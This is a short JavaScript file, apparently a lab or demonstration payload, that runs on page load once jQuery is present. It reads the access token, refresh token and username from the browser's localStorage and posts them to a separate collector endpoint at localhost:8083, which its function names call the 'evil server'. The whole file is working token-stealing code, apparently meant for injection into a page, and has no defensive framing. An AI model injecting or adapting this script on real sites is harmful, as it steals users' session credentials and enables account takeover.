if (typeof jQuery !== 'undefined') {
    (function($) {
        if (typeof(Storage) !== "undefined") {
            sendJwtToEvilServer();

        } else {
            console.log("LocalStorage not available");
        }
    })(jQuery);
}

function sendJwtToEvilServer() {
    var accessToken = localStorage.getItem("accessToken");

    if ('null' != accessToken ) {
        console.log("sendJwtToEvilServer... " + accessToken);
        var refreshToken = localStorage.getItem("refreshToken");
        var username = localStorage.getItem("username");
        saveJwt(username, accessToken, refreshToken);
    }
}

function saveJwt(username, accessToken, refreshToken) {
    var jsonData = "{\"username\":\""+username+"\",\"accessToken\":\""+accessToken+"\",\"refreshToken\":\""+refreshToken+"\"}"
    $.ajax({
        url: 'http://localhost:8083/jwt',
        type: 'post',
        data: jsonData,
        headers: {
            "Accept": 'application/json',
            "Content-Type": 'application/json'
        },
        success: function (data) {
            console.info(data);

        },
        error: function (data){
            console.info(data);
        }
    });
}